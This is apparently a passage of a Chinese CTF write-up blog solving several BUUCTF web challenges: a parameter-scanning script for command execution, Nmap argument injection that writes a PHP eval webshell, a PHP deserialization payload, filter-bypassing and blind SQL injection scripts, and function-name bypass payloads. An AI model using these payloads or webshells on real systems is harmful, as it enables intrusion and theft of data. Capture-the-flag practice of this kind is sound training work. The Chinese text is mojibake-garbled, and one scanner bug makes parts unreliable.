</span></span><span class="line"><span class="cl"><span class="n">requests</span><span class="o">.</span><span class="n">adapters</span><span class="o">.</span><span class="n">DEFAULT_RETRIES</span> <span class="o">=</span> <span class="mi">5</span> <span class="c1">#ËÆæÁΩÆÈáçËøûÊ¨°Êï∞ÔºåÈò≤Ê≠¢Á∫øÁ®ãÊï∞ËøáÈ´òÔºåÊñ≠ÂºÄËøûÊé•</span>
</span></span><span class="line"><span class="cl"><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span> 
</span></span><span class="line"><span class="cl"><span class="n">session</span><span class="o">.</span><span class="n">keep_alive</span> <span class="o">=</span> <span class="kc">False</span> <span class="c1"># ËÆæÁΩÆËøûÊé•Ê¥ªË∑ÉÁä∂ÊÄÅ‰∏∫False</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">buu_url</span> <span class="o">=</span> <span class="s2">&#34;http://35a34fe5-7916-4ebf-a7ff-bfd82fe9bd4a.node4.buuoj.cn:81&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">filePath</span> <span class="o">=</span> <span class="sa">r</span><span class="s2">&#34;D:\Downloads\src&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">chdir</span><span class="p">(</span><span class="n">filePath</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">files</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="n">filePath</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">flags</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">rrGET</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;\$_GET\[\&#39;(\w+)\&#39;\]&#34;</span><span class="p">)</span> <span class="c1"># ÂåπÈÖçgetÂèÇÊï∞</span>
</span></span><span class="line"><span class="cl"><span class="n">rrPOST</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;\$_POST\[\&#39;(\w+)\&#39;\]&#34;</span><span class="p">)</span> <span class="c1"># ÂåπÈÖçpostÂèÇÊï∞</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">getflag</span><span class="p">(</span><span class="n">file</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+]checking file:</span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">file</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">thread_</span><span class="o">.</span><span class="n">acquire</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="n">buu_url</span> <span class="o">+</span> <span class="s2">&#34;/&#34;</span> <span class="o">+</span> <span class="n">file</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">gets</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">rrGET</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()))</span>
</span></span><span class="line"><span class="cl">        <span class="n">posts</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">rrPOST</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()))</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">g</span> <span class="ow">in</span> <span class="n">gets</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[++]checking </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">g</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.02</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">res</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s2">&#34;?</span><span class="si">%s</span><span class="s2">=</span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="s2">&#34;echo ------&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s2">&#34;------&#34;</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">flag</span> <span class="o">=</span> <span class="s2">&#34;fileName=</span><span class="si">%s</span><span class="s2">, param=</span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">g</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">flags</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">posts</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[++]checking </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">p</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="n">res</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="n">p</span><span class="p">:</span><span class="s2">&#34;echo ------&#34;</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s2">&#34;------&#34;</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">flag</span> <span class="o">=</span> <span class="s2">&#34;fileName=</span><span class="si">%s</span><span class="s2">, param=</span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">g</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">flags</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">thread_</span><span class="o">.</span><span class="n">release</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">start_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">thread_list</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">file</span> <span class="ow">in</span> <span class="n">tqdm</span><span class="p">(</span><span class="n">files</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">t</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">getflag</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">file</span><span class="p">,))</span>
</span></span><span class="line"><span class="cl">        <span class="n">thread_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">thread_list</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">t</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">thread_list</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">t</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">flags</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">end_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[end]Á®ãÂ∫èÁªìÊùü:Áî®Êó∂(Áßí):&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">end_time</span><span class="o">-</span><span class="n">start_time</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÊúÄÂêéÂèÇÊï∞‰∏∫</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/xk0SzyKwfzw.php?Efa5BVG=cat /flag
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ÁΩëÈºéÊùØ-2020-Êú±ÈõÄÁªÑnmap">[ÁΩëÈºéÊùØ 2020 Êú±ÈõÄÁªÑ]Nmap
</h2><p>È¢òÁõÆÂè´nmapÊÉ≥Âà∞‰πãÂâçÁöÑ‰∏ÄÈÅìÈ¢òonline toolÁî®-oGÂèÇÊï∞ÂÜôÂÖ•Êú®È©¨ÔºåÁî®ÂçïÂºïÂè∑Âä†Á©∫Ê†ºÁªïËøá</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39; &lt;?php @eval($_POST[&#34;cmd&#34;]);?&gt; -oG shell.php &#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂõûÊòæhackerÔºåÂèØËÉΩÂåπÈÖç‰∫ÜÂêéÁºÄÂêçphp</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39; &lt;?= @eval($_POST[&#34;cmd&#34;]);?&gt; -oG shell.phtml &#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂõûÊòæhostmaybedown</p>
<p>Âä†‰∏äip</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">127.0.0.1 |&#39; &lt;?= @eval($_POST[&#34;cmd&#34;]);?&gt; -oG shell.phtml &#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>‰∏ä‰º†ÂêéËöÅÂâëËøûÊé•</p>
<p>Ëß£Ê≥ï‰∫åÁî®<code>-iL</code>ÂèÇÊï∞ËØªÂèñÊñá‰ª∂</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">127.0.0.1 |&#39; -iL /flag -o 1 &#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Âõ†‰∏∫Ê≥®ÈáäÈáåÈù¢ÊúâÊèêÁ§∫flagÂú®Ê†πÁõÆÂΩï</p>
<p>ËøôÊ†∑ÂÜçËÆøÈóÆ1Â∞±ÂæóÂà∞flag</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250216231516444.png"
	width="1521"
	height="819"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250216231516444_hu2269534670420213717.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250216231516444_hu970993745596054007.png 1024w"
	loading="lazy"
	
		alt="image-20250216231516444"
	
	
		class="gallery-image" 
		data-flex-grow="185"
		data-flex-basis="445px"
	
></p>
<h2 id="npuctf2020readlezphp">[NPUCTF2020]ReadlezPHP
</h2><p>ÂèçÂ∫èÂàóÂåñÔºåËøáÊª§systemÔºåÁî®assertÊü•Áúãphpinfo</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">HelloPhp</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="nv">$a</span><span class="o">=</span><span class="s1">&#39;phpinfo()&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="nv">$b</span><span class="o">=</span><span class="s1">&#39;assert&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$b</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$b</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$c</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">HelloPhp</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Êü•ÊâæflagÂ∞±Êúâ‰∫Ü</p>
<h2 id="swpu2019web1">[SWPU2019]Web1
</h2><p>sqlÊ≥®ÂÖ•ËøáÊª§‰∫ÜorÂíåÁ©∫Ê†ºÂíåÊ≥®ÈáäÔºåÁî®/**/ÁªïËøá</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-1&#39;union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;
</span></span><span class="line"><span class="cl">1&#39;/**/union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;
</span></span><span class="line"><span class="cl">1&#39;/**/union/**/select/**/1,database(),group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=&#34;web1&#34;&#39;
</span></span><span class="line"><span class="cl">1&#39;/**/union/**/select/**/1,database(),(select/**/group_concat(b)/**/from/**/(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="Êó†ÂàóÂêçÊ≥®ÂÖ•">Êó†ÂàóÂêçÊ≥®ÂÖ•
</h3><p>Â¶ÇÊûúinformation_schemaË¢´WAF,ÂæóÂà∞Ë°®Âêç‰πãÂêé‰ΩøÁî®Êó†ÂàóÂêçÊ≥®ÂÖ•ÊäÄÂ∑ßËé∑ÂèñÂ≠óÊÆµÂÄº.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select 1,2,3 union select * from ÊµãËØï
</span></span></code></pre></td></tr></table>
</div>
</div><p>‰πãÂêéÂ∞±ÂèØ‰ª•Âà©Áî®Êï∞Â≠óÊù•ÂØπÂ∫îÁõ∏Â∫îÁöÑÂàó,ËøõË°åÊü•ËØ¢</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select `2` from (select 1,2,3 union select * from ÊµãËØï) as test
</span></span></code></pre></td></tr></table>
</div>
</div><p>1„ÄÅÂàóÂêçÈúÄË¶ÅÁî®``ÂåÖË£πËµ∑Êù•</p>
<p>2„ÄÅ‰ΩøÁî®Â≠êÊü•ËØ¢ÁöÑÊó∂ÂÄô,Âç≥‰∏Ä‰∏™Êü•ËØ¢ÂµåÂ•óÂú®Âè¶‰∏Ä‰∏™Êü•ËØ¢‰∏≠,ÂÜÖÂ±ÇÊü•ËØ¢ÁöÑÁªìÊûúÂèØ‰ª•‰Ωú‰∏∫Â§ñÂ±ÇÊü•ËØ¢ÁöÑÊù°‰ª∂,ÂÜÖÂ±ÇÊü•ËØ¢Âà∞ÁöÑÁªìÊûúÈúÄË¶ÅËµ∑‰∏Ä‰∏™Âà´Âêç(as)</p>
<p>Â¶ÇÊûúÂèçÂºïÂè∑``Ë¢´ËøáÊª§,ÂèØ‰ª•‰ΩøÁî®‰∏∫Â≠óÊÆµËµ∑Âà´ÂêçÁöÑÊñπÂºè.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select b from (select 1,2 as b,3 union select * from ÊµãËØï) as test
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ÊûÅÂÆ¢Â§ßÊåëÊàò-2019finalsql">[ÊûÅÂÆ¢Â§ßÊåëÊàò 2019]FinalSQL
</h2><p>Áõ≤Ê≥®</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://5045a2b7-44b5-44ee-99d1-9db358afe49c.node5.buuoj.cn:81/search.php?&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">temp</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">column</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1000</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.06</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">low</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="cl">    <span class="n">high</span> <span class="o">=</span> <span class="mi">128</span>
</span></span><span class="line"><span class="cl">    <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="n">low</span> <span class="o">&lt;</span> <span class="n">high</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># Â∫ìÂêç</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#temp[&#34;id&#34;] = &#34;1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&#34; % (i, mid)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># Ë°®Âêç</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#temp[&#34;id&#34;] = &#34;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&gt;%d)^1&#34; %(i,mid)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># Â≠óÊÆµÂêç</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#temp[&#34;id&#34;] = &#34;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;F1naI1y&#39;)),%d,1))&gt;%d)^1&#34; %(i,mid)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># ÂÜÖÂÆπ</span>
</span></span><span class="line"><span class="cl">        <span class="n">temp</span><span class="p">[</span><span class="s2">&#34;id&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;1^(ascii(substr((select(group_concat(password))from(F1naI1y)),</span><span class="si">%d</span><span class="s2">,1))&gt;</span><span class="si">%d</span><span class="s2">)^1&#34;</span> <span class="o">%</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">mid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">temp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.04</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">low</span><span class="p">,</span> <span class="n">high</span><span class="p">,</span> <span class="n">mid</span><span class="p">,</span> <span class="s2">&#34;:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;Click&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">low</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">high</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">mid</span> <span class="o">==</span> <span class="mi">32</span> <span class="ow">or</span> <span class="n">mid</span> <span class="o">==</span> <span class="mi">127</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="cl">    <span class="n">column</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">column</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;All:&#34;</span><span class="p">,</span> <span class="n">column</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ciscn-2019-ÂàùËµõlove-math">[CISCN 2019 ÂàùËµõ]Love Math
</h2><p>ËøôÈáåÈªëÂêçÂçïËøáÊª§‰∫Ü‰∏çÂ∞ë‰∏úË•øÔºåÂ∏∏ËßÑÁöÑcat/flagÈÉΩ‰∏çËÉΩ‰ΩøÁî®‰∫ÜÔºåËøôÈáåÊúâ‰∏™Áü•ËØÜÁÇπÊòØphp‰∏≠ÂèØ‰ª•ÊääÂáΩÊï∞ÂêçÈÄöËøáÂ≠óÁ¨¶‰∏≤ÁöÑÊñπÂºè‰º†ÈÄíÁªô‰∏Ä‰∏™ÂèòÈáèÔºåÁÑ∂ÂêéÈÄöËøáÊ≠§ÂèòÈáèÂä®ÊÄÅË∞ÉÁî®ÂáΩÊï∞ÊØîÂ¶Ç‰∏ãÈù¢ÁöÑ‰ª£Á†Å‰ºöÊâßË°å system(‚Äòcat/flag‚Äô);</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?c=($_GET[a])($_GET[b])&amp;a=system&amp;b=cat /flag
</span></span></code></pre></td></tr></table>
</div>
</div><p>‰ΩÜÊòØËøôÈáåÁöÑ_GETÂíåaÔºåbÈÉΩ‰∏çÊòØÁôΩÂêçÂçïÈáåÈù¢ÁöÑÔºåËøôÈáåÈúÄË¶ÅÊõøÊç¢</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?c=($_GET[pi])($_GET[abs])&amp;pi=system&amp;abs=cat /flag
</span></span></code></pre></td></tr></table>
</div>
</div><p>‰ΩÜÊòØËøôÈáåÁöÑ_GETÊòØÊó†Ê≥ïËøõË°åÁõ¥Êé•ÊõøÊç¢ÔºåËÄå‰∏î[]‰πüË¢´ÈªëÂêçÂçïËøáÊª§‰∫Ü</p>
<p>hex2bin() ÂáΩÊï∞ÊääÂçÅÂÖ≠ËøõÂà∂ÂÄºÁöÑÂ≠óÁ¨¶‰∏≤ËΩ¨Êç¢‰∏∫ ASCII Â≠óÁ¨¶„ÄÇ</p>
<p>‰ΩÜÊòØhex2bin()ÂáΩÊï∞‰πü‰∏çÊòØÁôΩÂêçÂçïÈáåÈù¢ÁöÑÔºåËÄå‰∏îËøôÈáåÁöÑ5f 47 45 54‰πü‰∏çËÉΩÁõ¥Êé•Â°´ÂÖ•,‰ºöË¢´ËøáÊª§</p>
<p>ËøôÈáåÁöÑhex2bin()ÂáΩÊï∞ÂèØ‰ª•ÈÄöËøábase_convert()ÂáΩÊï∞Êù•ËøõË°åËΩ¨Êç¢</p>
<p>base_convert()ÂáΩÊï∞ËÉΩÂ§üÂú®‰ªªÊÑèËøõÂà∂‰πãÈó¥ËΩ¨Êç¢Êï∞Â≠ó</p>
<p>ËøôÈáåÁöÑhex2binÂèØ‰ª•ÁúãÂÅöÊòØ36ËøõÂà∂ÔºåÁî®base_convertÊù•ËΩ¨Êç¢Â∞ÜÂú®10ËøõÂà∂ÁöÑÊï∞Â≠óËΩ¨Êç¢‰∏∫16ËøõÂà∂Â∞±ÂèØ‰ª•Âá∫Áé∞hex2bin</p>
<p>hex2bin=base_convert(37907361743,10,36)</p>
